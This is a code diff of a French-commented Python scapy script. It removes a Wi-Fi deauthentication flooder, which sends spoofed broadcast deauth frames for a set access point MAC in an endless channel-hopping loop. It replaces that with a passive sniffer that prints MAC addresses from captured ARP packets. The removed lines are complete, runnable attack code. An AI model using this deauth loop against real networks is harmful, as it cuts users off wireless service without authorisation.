@@ -1,28 +1,25 @@
-import os
-import time
 from scapy.all import *
 
-# Définir l'interface à utiliser (e.g. wlan0, wlan1, etc.)
-interface = "wlan1"
+# Définition de la fonction pour scanner les réseaux
+def scan_networks():
+    # Création d'une liste pour stocker les adresses MAC
+    mac_addresses = []
 
-# Définir le canal à utiliser (e.g. 1, 6, 11, etc.)
-channel = 1
+    # Scan des réseaux
+    for packet in sniff(iface="wlan1", count=100):
+        # Vérification si le paquet est un paquet ARP
+        if packet.haslayer(ARP):
+            # Récupération de l'adresse MAC
+            mac_address = packet.hwsrc
+            # Ajout de l'adresse MAC à la liste
+            mac_addresses.append(mac_address)
 
-# Adresse MAC du point d'accès (AP)
-ap_address = "08:36:C9:98:11:A9"  # Remplacez par l'adresse MAC de votre AP
+    # Retour de la liste des adresses MAC
+    return mac_addresses
 
-# Créer le paquet de désauthentification
-packet = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address)/Dot11Deauth(reason=7)
+# Appel de la fonction pour scanner les réseaux
+mac_addresses = scan_networks()
 
-while True:
-    # Changer le canal
-    os.system(f"iwconfig {interface} channel {channel}")
-
-    # Envoyer le paquet
-    sendp(packet, iface=interface, verbose=0)
-
-    # Attendre 1 seconde
-    time.sleep(1)
-
-    # Incrémenter le canal
-    channel = (channel % 11) + 1
+# Affichage des adresses MAC
+for mac_address in mac_addresses:
+    print(mac_address)
